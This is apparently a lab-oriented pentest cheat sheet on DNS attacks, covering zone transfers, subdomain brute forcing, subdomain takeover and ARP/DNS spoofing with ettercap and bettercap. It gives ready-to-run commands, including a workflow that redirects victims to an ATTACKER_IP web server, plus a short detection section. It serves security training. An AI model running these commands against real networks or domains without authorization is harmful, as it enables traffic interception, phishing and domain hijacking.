# DNS Attack Quick Reference

## Default Ports
- **DNS**: 53 (UDP/TCP)
- UDP = default, TCP = zone transfers & large packets

## Enumeration

### Nmap
```bash
# Basic scan
nmap -p53 -Pn -sV -sC TARGET

# DNS scripts
nmap -p53 --script dns-zone-transfer,dns-nsid,dns-recursion TARGET
```

### DNS Record Types
- **A** - IPv4 address
- **AAAA** - IPv6 address
- **CNAME** - Canonical name (alias)
- **MX** - Mail server
- **NS** - Name server
- **TXT** - Text records
- **SOA** - Start of authority

## DNS Zone Transfer (AXFR)

### What is it?
DNS servers copy zone data between each other. If misconfigured, anyone can request full zone data.

### dig (Manual)
```bash
# Get nameservers first
dig ns domain.com @DNS_SERVER

# Attempt zone transfer
dig axfr @ns1.domain.com domain.com

# Full example
dig axfr @10.129.110.213 inlanefreight.htb
```

### host (Alternative)
```bash
# Zone transfer
host -l domain.com ns1.domain.com

# Example
host -l inlanefreight.htb ns1.inlanefreight.htb
```

### fierce (Automated)
```bash
# Enumerate and attempt zone transfer
fierce --domain domain.com

# With DNS server
fierce --domain domain.com --dns-servers ns1.domain.com
```

### dnsrecon
```bash
# Zone transfer
dnsrecon -d domain.com -t axfr

# Full enumeration
dnsrecon -d domain.com -a
```

## Subdomain Enumeration

### Subfinder (Passive - No DNS queries)
```bash
# Basic
subfinder -d domain.com

# Verbose
subfinder -d domain.com -v

# Output to file
subfinder -d domain.com -o subdomains.txt
```

### Sublist3r (Active + Passive)
```bash
# Basic
sublist3r -d domain.com

# With brute force
sublist3r -d domain.com -b

# Specify threads
sublist3r -d domain.com -t 50
```

### Subbrute (DNS Brute Force)
```bash
# Clone
git clone https://github.com/TheRook/subbrute.git
cd subbrute

# Create resolver file
echo "ns1.domain.com" > resolvers.txt

# Run
./subbrute.py domain.com -s ./names.txt -r ./resolvers.txt
```

### amass (Comprehensive)
```bash
# Basic enumeration
amass enum -d domain.com

# Passive only
amass enum -passive -d domain.com

# Active with brute force
amass enum -active -d domain.com -brute
```

### gobuster (DNS Brute Force)
```bash
# DNS mode
gobuster dns -d domain.com -w /usr/share/wordlists/subdomains.txt

# With custom resolvers
gobuster dns -d domain.com -w wordlist.txt -r 8.8.8.8
```

### ffuf (DNS Brute Force)
```bash
# Subdomain fuzzing
ffuf -w subdomains.txt -u http://FUZZ.domain.com

# DNS mode
ffuf -w subdomains.txt -u http://FUZZ.domain.com -mc 200
```

## Subdomain Takeover

### Identify potential takeovers

#### Check CNAME records
```bash
# Using host
host support.domain.com

# Output:
# support.domain.com is an alias for abandoned.s3.amazonaws.com

# Using dig
dig support.domain.com CNAME
```

### Common vulnerable services
- **AWS S3** - `*.s3.amazonaws.com`
- **GitHub Pages** - `*.github.io`
- **Heroku** - `*.herokuapp.com`
- **Azure** - `*.azurewebsites.net`
- **Shopify** - `*.myshopify.com`
- **Tumblr** - `*.tumblr.com`

### Test for takeover
```bash
# Visit URL in browser
curl https://support.domain.com

# Look for errors:
# - "NoSuchBucket" (AWS)
# - "404 - There isn't a GitHub Pages site here"
# - "No such app" (Heroku)
```

### SubOver (Automated tool)
```bash
# Install
go install github.com/Ice3man543/SubOver@latest

# Check subdomains
./SubOver -l subdomains.txt

# With threads
./SubOver -l subdomains.txt -t 50
```

### subjack
```bash
# Install
go install github.com/haccer/subjack@latest

# Scan
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
```

### can-i-take-over-xyz (Reference)
```bash
# Check repository for vulnerable services
https://github.com/EdOverflow/can-i-take-over-xyz
```

## DNS Spoofing / Cache Poisoning

### Local MITM Attack

#### Ettercap

##### Setup
```bash
# Edit DNS records
sudo nano /etc/ettercap/etter.dns

# Add entries:
domain.com      A   ATTACKER_IP
*.domain.com    A   ATTACKER_IP
```

##### Execute
```bash
# Start Ettercap
sudo ettercap -G

# GUI Steps:
# 1. Hosts → Scan for hosts
# 2. Hosts → Host list
# 3. Add target to Target 1
# 4. Add gateway to Target 2
# 5. Plugins → Manage Plugins → dns_spoof
```

##### Command Line
```bash
# MITM attack with DNS spoofing
sudo ettercap -T -M arp:remote /TARGET_IP// /GATEWAY_IP// -P dns_spoof
```

#### Bettercap (Modern alternative)
```bash
# Start bettercap
sudo bettercap -iface eth0

# Set DNS spoofing
set dns.spoof.domains domain.com,*.domain.com
set dns.spoof.address ATTACKER_IP

# Start ARP spoofing
set arp.spoof.targets TARGET_IP
arp.spoof on

# Start DNS spoofing
dns.spoof on
```

## Quick Attack Workflows

### Workflow 1: Zone transfer
```bash
# 1. Get nameservers
dig ns domain.com

# 2. Attempt zone transfer
dig axfr @ns1.domain.com domain.com

# 3. If successful, enumerate all subdomains/IPs
# 4. Test each discovered host
```

### Workflow 2: Subdomain enumeration
```bash
# 1. Passive enumeration
subfinder -d domain.com -o subs.txt

# 2. Active brute force
gobuster dns -d domain.com -w /usr/share/wordlists/dns.txt >> subs.txt

# 3. Check for takeovers
while read sub; do host $sub; done < subs.txt

# 4. Identify CNAME pointing to external services
```

### Workflow 3: Subdomain takeover
```bash
# 1. Find subdomains
subfinder -d domain.com -o subs.txt

# 2. Check CNAMEs
for sub in $(cat subs.txt); do host $sub | grep "alias"; done

# 3. Test for errors
curl https://vulnerable.domain.com

# 4. If "NoSuchBucket", register bucket on AWS
# 5. Create S3 bucket with exact subdomain name
```

### Workflow 4: DNS spoofing (Local network)
```bash
# 1. Edit etter.dns
sudo nano /etc/ettercap/etter.dns
# Add: domain.com A ATTACKER_IP

# 2. Start Ettercap
sudo ettercap -T -M arp:remote /TARGET// /GATEWAY// -P dns_spoof

# 3. Setup fake web server
sudo python3 -m http.server 80

# 4. Victim visits domain.com → redirected to attacker
```

## DNS Reconnaissance Commands

```bash
# A record (IPv4)
dig A domain.com

# AAAA record (IPv6)
dig AAAA domain.com

# MX records (mail servers)
dig MX domain.com

# NS records (nameservers)
dig NS domain.com

# TXT records
dig TXT domain.com

# All records
dig ANY domain.com

# Specific DNS server
dig @8.8.8.8 domain.com

# Reverse DNS lookup
dig -x IP_ADDRESS
```

## Useful Wordlists

```bash
# SecLists subdomains
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Common subdomains
/usr/share/wordlists/amass/subdomains.lst

# DNSRecon
/usr/share/dnsrecon/namelist.txt
```

## Tools Quick Reference

| Tool | Purpose | Command |
|------|---------|---------|
| **dig** | Manual DNS queries | `dig axfr @ns1.domain.com domain.com` |
| **fierce** | Zone transfer + enum | `fierce --domain domain.com` |
| **subfinder** | Passive subdomain enum | `subfinder -d domain.com` |
| **sublist3r** | Subdomain enum | `sublist3r -d domain.com` |
| **amass** | Comprehensive enum | `amass enum -d domain.com` |
| **gobuster** | DNS brute force | `gobuster dns -d domain.com -w wordlist` |
| **SubOver** | Takeover detection | `SubOver -l subs.txt` |
| **ettercap** | DNS spoofing | `ettercap -T -M arp -P dns_spoof` |
| **bettercap** | Modern MITM | `bettercap -iface eth0` |

## Detection Indicators

### Zone transfer attempts
- Multiple AXFR requests
- Requests from unusual IPs

### DNS spoofing
- Duplicate IP addresses on network
- ARP cache poisoning
- DNS responses from unexpected sources

### Subdomain takeover
- Sudden changes in DNS records
- Unusual CNAME targets
- External service registrations

## Quick Checks

```bash
# Check if zone transfer allowed
dig axfr @TARGET domain.com

# Find nameservers
dig ns domain.com +short

# Check DNSSEC
dig +dnssec domain.com

# Trace DNS path
dig +trace domain.com

# Check reverse DNS
dig -x IP_ADDRESS +short
```

## Common Errors = Opportunities

- **NoSuchBucket** (AWS) → Subdomain takeover
- **404 GitHub Pages** → Subdomain takeover
- **Zone transfer success** → Full DNS enumeration
- **Wildcard DNS** → May hide subdomains

## Notes

- Zone transfers use **TCP port 53**
- Regular queries use **UDP port 53**
- Always check **CNAME records** for takeovers
- **Wildcards** (`*.domain.com`) can hide real subdomains
- Modern DNS servers usually block zone transfers
